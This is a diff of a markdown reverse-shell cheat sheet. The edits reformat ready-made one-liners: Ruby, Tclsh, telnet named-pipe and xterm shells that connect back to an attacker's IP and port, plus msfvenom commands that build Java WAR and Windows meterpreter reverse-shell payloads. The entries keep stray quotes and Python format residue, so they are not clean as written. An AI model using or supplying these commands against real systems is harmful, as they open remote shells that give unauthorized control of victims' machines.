@@ -167,13 +167,13 @@ ruby -rsocket -e \'c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"
 ```        
  
  ```bash
- # Tclsh
- 'echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ipaddr, port),
+# Tclsh
+echo \'set s [socket %s %d];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;\' | tclsh' % (ipaddr, port),
 ```
 
 ```bash
 # Telnet
-'rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0/tmp/p' % (ipaddr, port),
+rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0/tmp/p' % (ipaddr, port),
 
 
 ```bash
@@ -187,12 +187,12 @@ msfvenom -p java/shell_reverse_tcp LHOST=%s LPORT=%d -f war -o revshell.war' % (
 ```
 
 ```bash
-# WIN - bin':
-'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f exe > revshell.exe' % (ipaddr, port),
+# WIN - Bin
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f exe > revshell.exe' % (ipaddr, port),
 ```
 
 ```bash
-# xterm':'
+# Xterm
 xterm -display %s:1 \n\n[+] Connect to your shell with:\n\nXnest :1 or xhost +targetip' % (ipaddr)
 ```
 
